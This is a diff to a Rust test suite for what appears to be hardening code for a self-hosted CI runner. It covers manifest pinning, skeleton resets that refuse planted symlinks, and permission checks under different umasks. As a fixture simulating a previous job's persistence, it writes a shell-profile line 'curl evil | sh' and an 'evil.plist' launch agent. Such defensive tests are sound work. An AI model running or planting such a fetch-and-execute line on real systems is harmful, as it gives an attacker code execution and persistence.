@@ -251,23 +251,34 @@ fn sha256_hex(bytes: &[u8]) -> String {
     format!("{:x}", Sha256::digest(bytes))
 }
 
+fn mkdir_mode(path: impl AsRef<std::path::Path>, mode: u32) {
+    let p = path.as_ref();
+    std::fs::create_dir_all(p).unwrap();
+    std::fs::set_permissions(p, std::fs::Permissions::from_mode(mode)).unwrap();
+}
+
+fn write_skeleton_entry(path: impl AsRef<std::path::Path>, contents: impl AsRef<[u8]>, mode: u32) {
+    let p = path.as_ref();
+    if let Some(parent) = p.parent() {
+        mkdir_mode(parent, 0o755);
+    }
+    std::fs::write(p, contents).unwrap();
+    std::fs::set_permissions(p, std::fs::Permissions::from_mode(mode)).unwrap();
+}
+
 #[test]
 fn runner_tree_must_match_the_pinned_manifest_before_every_launch() {
     let tree = tempfile::tempdir().unwrap();
+    std::fs::set_permissions(tree.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
     let uid = unsafe { libc::geteuid() };
     let dir = tree.path().join("actions-runner");
-    std::fs::create_dir_all(dir.join("bin")).unwrap();
-    std::fs::create_dir_all(dir.join("_work/job")).unwrap();
-    std::fs::create_dir_all(dir.join("_diag")).unwrap();
-    std::fs::write(dir.join("run.sh"), "#!/bin/sh\n").unwrap();
-    std::fs::write(dir.join("bin/Runner.Listener"), "listener").unwrap();
+    mkdir_mode(dir.join("bin"), 0o755);
+    mkdir_mode(dir.join("_work/job"), 0o700);
+    mkdir_mode(dir.join("_diag"), 0o700);
+    write_skeleton_entry(dir.join("run.sh"), "#!/bin/sh\n", 0o755);
+    write_skeleton_entry(dir.join("bin/Runner.Listener"), "listener", 0o755);
     std::os::unix::fs::symlink("Runner.Listener", dir.join("bin/listener")).unwrap();
-    for path in [dir.clone(), dir.join("bin")] {
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
-    }
-    for file in ["run.sh", "bin/Runner.Listener"] {
-        std::fs::set_permissions(dir.join(file), std::fs::Permissions::from_mode(0o755)).unwrap();
-    }
+    mkdir_mode(&dir, 0o755);
     let manifest_text = runner_manifest_for(&dir, Some(uid)).unwrap();
     assert!(manifest_text.contains("link Runner.Listener bin/listener"));
     assert!(
@@ -275,8 +286,7 @@ fn runner_tree_must_match_the_pinned_manifest_before_every_launch() {
         "runner-writable dirs are excluded"
     );
     let manifest = tree.path().join("runner-manifest.txt");
-    std::fs::write(&manifest, &manifest_text).unwrap();
-    std::fs::set_permissions(&manifest, std::fs::Permissions::from_mode(0o644)).unwrap();
+    write_skeleton_entry(&manifest, &manifest_text, 0o644);
     let pin = sha256_hex(manifest_text.as_bytes());
     verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
     // Job output in _work does not matter.
@@ -284,19 +294,14 @@ fn runner_tree_must_match_the_pinned_manifest_before_every_launch() {
     verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
     // A different pin, a modified file, a mode change, an extra file: refused.
     assert!(verify_runner_tree(&dir, &manifest, &"0".repeat(64), Some(uid)).is_err());
-    std::fs::write(dir.join("run.sh"), "#!/bin/sh\nexit 0\n").unwrap();
+    write_skeleton_entry(dir.join("run.sh"), "#!/bin/sh\nexit 0\n", 0o755);
     assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
-    std::fs::write(dir.join("run.sh"), "#!/bin/sh\n").unwrap();
+    write_skeleton_entry(dir.join("run.sh"), "#!/bin/sh\n", 0o755);
     verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
     std::fs::set_permissions(dir.join("run.sh"), std::fs::Permissions::from_mode(0o775)).unwrap();
     assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
     std::fs::set_permissions(dir.join("run.sh"), std::fs::Permissions::from_mode(0o755)).unwrap();
-    std::fs::write(dir.join("bin/extra"), "x").unwrap();
-    std::fs::set_permissions(
-        dir.join("bin/extra"),
-        std::fs::Permissions::from_mode(0o644),
-    )
-    .unwrap();
+    write_skeleton_entry(dir.join("bin/extra"), "x", 0o644);
     assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
     std::fs::remove_file(dir.join("bin/extra")).unwrap();
     // Another owner (root in production) is refused.
@@ -321,23 +326,23 @@ fn job_home_and_work_are_recreated_from_the_skeleton_before_every_job() {
     let uid = unsafe { libc::geteuid() };
     let gid = unsafe { libc::getegid() };
     let skel = root.path().join("skel");
-    std::fs::create_dir_all(skel.join(".config")).unwrap();
-    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
-    std::fs::write(skel.join(".config/git"), "[core]\n").unwrap();
-    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
+    mkdir_mode(&skel, 0o755);
+    mkdir_mode(skel.join(".config"), 0o755);
+    write_skeleton_entry(skel.join(".zshrc"), "export SKEL=1\n", 0o644);
+    write_skeleton_entry(skel.join(".config/git"), "[core]\n", 0o644);
     let home = root.path().join("home");
     let work = root.path().join("_work");
     let diag = root.path().join("_diag");
     // A previous job left persistence and caches behind.
-    std::fs::create_dir_all(home.join("Library/LaunchAgents")).unwrap();
-    std::fs::write(home.join("Library/LaunchAgents/evil.plist"), "x").unwrap();
-    std::fs::write(home.join(".zshrc"), "curl evil | sh\n").unwrap();
-    std::fs::create_dir_all(work.join("old/target")).unwrap();
-    std::fs::write(work.join("old/target/cache"), "x").unwrap();
+    mkdir_mode(home.join("Library/LaunchAgents"), 0o755);
+    write_skeleton_entry(home.join("Library/LaunchAgents/evil.plist"), "x", 0o644);
+    write_skeleton_entry(home.join(".zshrc"), "curl evil | sh\n", 0o644);
+    mkdir_mode(work.join("old/target"), 0o755);
+    write_skeleton_entry(work.join("old/target/cache"), "x", 0o644);
     // A symlink planted in place of a work dir is removed, never followed.
     let outside = root.path().join("outside");
-    std::fs::create_dir(&outside).unwrap();
-    std::fs::write(outside.join("keep"), "x").unwrap();
+    mkdir_mode(&outside, 0o755);
+    write_skeleton_entry(outside.join("keep"), "x", 0o644);
     std::os::unix::fs::symlink(&outside, &diag).unwrap();
     reset_job_area(&skel, &home, &[work.clone(), diag.clone()], uid, uid, gid).unwrap();
     assert_eq!(
@@ -357,13 +362,12 @@ fn job_home_and_work_are_recreated_from_the_skeleton_before_every_job() {
 #[test]
 fn toolchain_must_be_owner_only() {
     let root = tempfile::tempdir().unwrap();
+    std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
     let uid = unsafe { libc::geteuid() };
     let tool = root.path().join("toolchain");
-    std::fs::create_dir_all(tool.join("rustup")).unwrap();
-    std::fs::create_dir_all(tool.join("cargo/bin")).unwrap();
-    for dir in [tool.clone(), tool.join("rustup"), tool.join("cargo/bin")] {
-        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
-    }
+    mkdir_mode(&tool, 0o755);
+    mkdir_mode(tool.join("rustup"), 0o755);
+    mkdir_mode(tool.join("cargo/bin"), 0o755);
     verify_toolchain(&tool, uid).unwrap();
     assert!(verify_toolchain(&tool, uid.wrapping_add(1)).is_err());
     std::fs::set_permissions(
@@ -381,16 +385,16 @@ fn reset_never_writes_through_a_symlink_planted_in_the_job_home() {
     let uid = unsafe { libc::geteuid() };
     let gid = unsafe { libc::getegid() };
     let skel = root.path().join("skel");
-    std::fs::create_dir_all(skel.join(".ssh")).unwrap();
-    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
-    std::fs::write(skel.join(".ssh/config"), "Host *\n").unwrap();
-    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
+    mkdir_mode(&skel, 0o755);
+    mkdir_mode(skel.join(".ssh"), 0o700);
+    write_skeleton_entry(skel.join(".zshrc"), "export SKEL=1\n", 0o644);
+    write_skeleton_entry(skel.join(".ssh/config"), "Host *\n", 0o600);
     // Stand-ins for /etc/sudoers.d/x and a root-owned directory.
     let outside = root.path().join("outside");
-    std::fs::create_dir(&outside).unwrap();
-    std::fs::write(outside.join("sudoers"), "original\n").unwrap();
+    mkdir_mode(&outside, 0o755);
+    write_skeleton_entry(outside.join("sudoers"), "original\n", 0o644);
     let home = root.path().join("home");
-    std::fs::create_dir(&home).unwrap();
+    mkdir_mode(&home, 0o755);
     std::os::unix::fs::symlink(outside.join("sudoers"), home.join(".zshrc")).unwrap();
     std::os::unix::fs::symlink(&outside, home.join(".ssh")).unwrap();
     // Also pre-plant the temporary build name as a symlink to a directory.
@@ -425,6 +429,143 @@ fn reset_never_writes_through_a_symlink_planted_in_the_job_home() {
     reset_job_area(&skel, &home, &[], uid, uid, gid).unwrap();
     assert!(std::fs::symlink_metadata(&home).unwrap().is_dir());
     assert_eq!(std::fs::read_dir(&outside).unwrap().count(), 1);
+}
+
+struct UmaskGuard {
+    prev: libc::mode_t,
+}
+
+impl UmaskGuard {
+    fn new(mask: libc::mode_t) -> Self {
+        let prev = unsafe { libc::umask(mask) };
+        Self { prev }
+    }
+}
+
+impl Drop for UmaskGuard {
+    fn drop(&mut self) {
+        unsafe {
+            libc::umask(self.prev);
+        }
+    }
+}
+
+#[test]
+fn serial_host_runner_tree_and_skeleton_reset_succeed_under_group_writable_umask() {
+    for mask in [0o002, 0o022] {
+        let _umask = UmaskGuard::new(mask);
+        let root = tempfile::tempdir().unwrap();
+        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
+        let uid = unsafe { libc::geteuid() };
+        let gid = unsafe { libc::getegid() };
+
+        // 1. Verify runner tree under ambient umask:
+        let tree_dir = root.path().join("actions-runner");
+        mkdir_mode(tree_dir.join("bin"), 0o755);
+        mkdir_mode(tree_dir.join("_work/job"), 0o700);
+        mkdir_mode(tree_dir.join("_diag"), 0o700);
+        write_skeleton_entry(tree_dir.join("run.sh"), "#!/bin/sh\n", 0o755);
+        write_skeleton_entry(tree_dir.join("bin/Runner.Listener"), "listener", 0o755);
+        std::os::unix::fs::symlink("Runner.Listener", tree_dir.join("bin/listener")).unwrap();
+        mkdir_mode(&tree_dir, 0o755);
+
+        let manifest_text = runner_manifest_for(&tree_dir, Some(uid)).unwrap();
+        let manifest = root.path().join("manifest.txt");
+        write_skeleton_entry(&manifest, &manifest_text, 0o644);
+        let pin = sha256_hex(manifest_text.as_bytes());
+        verify_runner_tree(&tree_dir, &manifest, &pin, Some(uid)).unwrap();
+
+        // 2. Verify skeleton creation and reset_job_area under ambient umask:
+        let skel = root.path().join("skel");
+        mkdir_mode(&skel, 0o755);
+        mkdir_mode(skel.join(".config"), 0o755);
+        write_skeleton_entry(skel.join(".zshrc"), "export SKEL=1\n", 0o644);
+        write_skeleton_entry(skel.join(".config/git"), "[core]\n", 0o644);
+
+        // All skeleton entries must be owner-only regardless of umask
+        assert_eq!(
+            std::fs::metadata(&skel).unwrap().permissions().mode() & 0o022,
+            0,
+            "skel directory must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(skel.join(".config"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o022,
+            0,
+            "skel/.config must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(skel.join(".zshrc"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o022,
+            0,
+            "skel/.zshrc must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(skel.join(".config/git"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o022,
+            0,
+            "skel/.config/git must be owner-only under umask {mask:o}"
+        );
+
+        let home = root.path().join(format!("home-{mask:o}"));
+        let work = root.path().join(format!("work-{mask:o}"));
+        let diag = root.path().join(format!("diag-{mask:o}"));
+
+        reset_job_area(&skel, &home, &[work.clone(), diag.clone()], uid, uid, gid).unwrap();
+
+        // Verify that the recreated home and its contents are all owner-only
+        assert_eq!(
+            std::fs::metadata(&home).unwrap().permissions().mode() & 0o022,
+            0,
+            "recreated home must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(home.join(".config"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o022,
+            0,
+            "recreated home/.config must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(home.join(".zshrc"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o022,
+            0,
+            "recreated home/.zshrc must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(home.join(".config/git"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o022,
+            0,
+            "recreated home/.config/git must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(&work).unwrap().permissions().mode() & 0o022,
+            0,
+            "work directory must be owner-only under umask {mask:o}"
+        );
+        assert_eq!(
+            std::fs::metadata(&diag).unwrap().permissions().mode() & 0o022,
+            0,
+            "diag directory must be owner-only under umask {mask:o}"
+        );
+    }
 }
 
 #[test]
